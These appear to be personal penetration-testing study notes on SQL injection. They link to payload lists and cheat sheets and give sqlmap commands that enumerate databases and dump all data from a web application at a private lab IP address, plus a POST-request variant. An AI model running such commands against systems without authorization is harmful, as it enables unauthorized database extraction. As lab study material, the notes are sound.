# SQL Injection & SQLMAP commands

## References


Payloads
https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b

Pentestmonkey covers different version of databases
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet



##  Mysql login page bypass using sql injection 

https://sechow.com/bricks/docs/login-1.html

## SQLmap command

1. To list the databases
sqlmap -u "http://192.168.124.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user"  --risk=3 --level=5 --dbs --threads=4 --batch

2. List all the datas from a database
sqlmap -u "http://192.168.124.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user"  -D jabcd0cs --risk=3 --level=5 --dump-all --batch

Database name - jabcd0cs

POST Request
sqlmap -r req.txt --level=5 --risk=3 --dbs
